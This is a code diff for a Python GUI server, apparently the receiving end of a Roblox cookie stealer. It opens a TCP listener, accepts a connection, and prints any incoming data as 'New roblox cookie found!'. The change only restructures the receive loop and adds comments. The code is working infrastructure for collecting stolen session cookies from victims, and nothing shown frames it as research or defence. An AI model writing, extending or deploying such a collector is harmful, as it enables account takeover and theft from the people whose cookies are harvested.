@@ -71,8 +71,7 @@ class Frame(GUIserver):
             self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.s.bind(addr)
             self.s.listen(10)
-
-        except Exception as e:
+        except Exception as e:  # exception while connecting
             self.print(e)
             return
 
@@ -80,25 +79,23 @@ class Frame(GUIserver):
         self.print(
             f"Server Started! (Server is listening at {addr[0]}:{addr[1]})")
 
-        sock, ad = self.s.accept()
+        sock, ad = self.s.accept()  # NEW CONNECTION FOUND
 
         self.print(
             f"New connection found at {ad}"
         )
 
         while True:
-            while True:
-                data = sock.recv(1024).decode()
-                if not data:
-                    break
-                if data == 'False':
-                    self.print("No cookie found!")
-                    break
-                self.print(f"New roblox cookie found!")
-                self.print(data)
+            data = sock.recv(1024).decode()
+            if not data:
                 break
-
-            sock.close()
+            if data == 'False':
+                self.print("No cookie found!")
+                break
+            self.print(f"New roblox cookie found!")
+            self.print(data)
+            break
+        sock.close()
 
     def stop(self, event):
         self.s.close()
